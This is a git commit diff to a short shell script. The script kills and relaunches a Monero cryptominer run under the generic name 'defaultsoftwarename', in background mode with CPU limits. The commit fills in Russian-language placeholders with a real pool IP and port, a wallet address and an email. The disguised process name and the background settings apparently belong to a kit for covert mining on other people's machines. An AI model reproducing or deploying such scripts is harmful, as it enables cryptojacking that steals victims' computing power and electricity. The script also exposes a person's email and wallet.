d73b7499384f420b138b508ef338e60b40f4df5e
pdium <58967712+pdium@users.noreply.github.com>
2019-12-19 14:33:04 +0700

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 91.134.14.19:49228 -u 49ZGDHbcHodNp84GafPZ2GSEY3oqDUCVWYK3et4xBeyQRsEZH3vpKwjCGwEhZgPsdT3QPyjx2iVCrNi2EVHzohB7JmXRdEh --pass=x:pdium80@gmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
